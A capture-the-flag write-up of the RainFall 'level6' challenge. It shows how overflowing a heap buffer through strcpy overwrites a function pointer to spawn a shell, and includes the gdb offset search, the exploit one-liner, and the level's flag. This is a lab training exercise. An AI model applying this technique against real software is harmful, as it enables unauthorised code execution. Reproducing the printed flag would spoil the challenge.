The binary allocates memory on the heap, stores a function pointer, and later calls it. It segfaults when run with no arguments, but prints Nope if an argument is passed.

We want to hijack the control flow and get it to call a hidden function n(), which executes system("/bin/sh") and gives us a shell.

step 1: Understand the Functions
There is a hidden function n() that calls system("/bin/sh"):
0x08048454 <n>: call 0x80483b0 <system@plt>
It is never called normally. But we want to execute it.

There is also a function m() that is actually called and just prints "Nope\n".
So the plan is: overwrite the function pointer that normally points to m() and make it point to n() instead.

Step 2: Understand the Heap Layout
Let’s disassemble main():
int main(int argc, char **argv) {
    char *buf = malloc(64);               // Allocate 64 bytes
    void (**func_ptr)() = malloc(4);      // Allocate 4 bytes for a function pointer
    *func_ptr = m;                        // func_ptr initially points to m()

    strcpy(buf, argv[1]);                 // ⚠️ Vulnerable: no bounds check

    (*func_ptr)();                        // Call the function pointer

    return 0;
}

This is a heap-based function pointer overwrite vulnerability.
Because strcpy() doesn't check bounds, if you provide more than 64 bytes in argv[1], it will:
Fill the first malloc(64) buffer (buf).
Then overflow into the memory directly after, which is the second malloc(4) — the one holding the function pointer.

Step 3: Find the Offset for Overwrite
We use a pattern to find out how many bytes are needed before we overwrite the function pointer:

```
level6@RainFall:~$ gdb level6
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Program received signal SIGSEGV, Segmentation fault.
0x41346341 in ?? ()
(gdb) info registers
eip            0x41346341       0x41346341
The EIP value 0x41346341 corresponds to offset 72 bytes.
```

So we need to overflow the heap with 72 bytes of padding, followed by the 4-byte address of n().

Step 4: Find the Address of n()

(gdb) info functions n
0x08048454  n
So the address we want to jump to is: 0x08048454.

Step 5: Craft the Exploit
Since the binary segfaults with no argument, we cannot use stdin easily. Instead, we pass the payload directly as an argument.

We construct it with:

72 bytes of padding ("A" * 72)

Address of n() in little-endian order: \x54\x84\x04\x08

Final payload:
level6@RainFall:~$ ./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d


